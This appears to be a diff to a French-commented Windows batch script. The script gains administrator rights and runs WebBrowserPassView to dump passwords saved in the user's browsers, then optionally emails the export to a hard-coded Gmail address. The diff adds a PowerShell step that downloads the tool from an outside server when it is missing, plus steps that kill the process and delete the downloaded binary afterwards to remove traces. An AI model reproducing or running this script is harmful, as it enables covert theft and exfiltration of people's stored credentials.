@@ -1,4 +1,5 @@
 @echo off
+
 rem Elevation en administrateur
 net session >nul 2>&1
 if %errorlevel% neq 0 (
@@ -7,7 +8,9 @@ if %errorlevel% neq 0 (
 )
 
 set "WBPV=%~dp0WebBrowserPassView.exe"
+set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/general/batch/WebBrowserPassView.exe"
 set "EMAIL=alexandre.janacek@gmail.com"
+set "DOWNLOADED=0"
 
 rem Configuration email
 set "SMTP_USER=alexandre.janacek@gmail.com"
@@ -32,10 +35,19 @@ if "%choice%"=="0" exit /b
 goto MENU
 
 :EXPORT
+rem Telecharger si necessaire
 if not exist "%WBPV%" (
-  echo WebBrowserPassView.exe non trouve.
-  pause
-  goto MENU
+  echo.
+  echo Telechargement de WebBrowserPassView.exe...
+  powershell -Command "try { Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%WBPV%' -UseBasicParsing; Write-Host 'Telechargement termine!' -ForegroundColor Green } catch { Write-Host 'Erreur:' $_.Exception.Message -ForegroundColor Red; exit 1 }"
+  
+  if %errorlevel% neq 0 (
+    echo Erreur lors du telechargement.
+    pause
+    goto MENU
+  )
+  set "DOWNLOADED=1"
+  timeout /t 1 /nobreak >nul
 )
 
 rem Generer un nom de fichier unique
@@ -54,22 +66,45 @@ powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivat
 timeout /t 3 /nobreak >nul
 
 taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
+
+rem Attendre que le processus se termine completement
+timeout /t 2 /nobreak >nul
+
+rem Supprimer le fichier si telecharge
+if "%DOWNLOADED%"=="1" (
+  echo Nettoyage...
+  del /F /Q "%WBPV%" >nul 2>&1
+  if exist "%WBPV%" (
+    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
+  )
+)
 
 if exist "%OUTPUT%" (
   echo Termine. Fichier sauvegarde: %OUTPUT%
+  echo.
+  echo Fermeture automatique dans 2 secondes...
+  timeout /t 2 /nobreak >nul
+  exit /b
 ) else (
   echo ERREUR: Le fichier n a pas ete cree.
+  pause
+  exit /b
 )
 
-echo.
-pause
-exit /b
-
 :EXPORT_AND_SEND
+rem Telecharger si necessaire
 if not exist "%WBPV%" (
-  echo WebBrowserPassView.exe non trouve.
-  pause
-  goto MENU
+  echo.
+  echo Telechargement de WebBrowserPassView.exe...
+  powershell -Command "try { Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%WBPV%' -UseBasicParsing; Write-Host 'Telechargement termine!' -ForegroundColor Green } catch { Write-Host 'Erreur:' $_.Exception.Message -ForegroundColor Red; exit 1 }"
+  
+  if %errorlevel% neq 0 (
+    echo Erreur lors du telechargement.
+    pause
+    goto MENU
+  )
+  set "DOWNLOADED=1"
+  timeout /t 1 /nobreak >nul
 )
 
 rem Generer un nom de fichier unique
@@ -89,8 +124,18 @@ timeout /t 3 /nobreak >nul
 
 taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
 
+rem Attendre que le processus se termine completement
+timeout /t 2 /nobreak >nul
+
 if not exist "%OUTPUT%" (
   echo ERREUR: Le fichier n a pas ete cree.
+  rem Supprimer le fichier si telecharge
+  if "%DOWNLOADED%"=="1" (
+    del /F /Q "%WBPV%" >nul 2>&1
+    if exist "%WBPV%" (
+      powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
+    )
+  )
   pause
   goto MENU
 )
@@ -129,8 +174,19 @@ try { ^
     Write-Host 'Erreur lors de l envoi:' $_.Exception.Message -ForegroundColor Red ^
 }"
 
+rem Supprimer le fichier si telecharge
+if "%DOWNLOADED%"=="1" (
+  echo.
+  echo Nettoyage...
+  del /F /Q "%WBPV%" >nul 2>&1
+  if exist "%WBPV%" (
+    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
+  )
+)
+
 echo.
-pause
+echo Fermeture automatique dans 2 secondes...
+timeout /t 2 /nobreak >nul
 exit /b
 
 :GET_UNIQUE_FILENAME
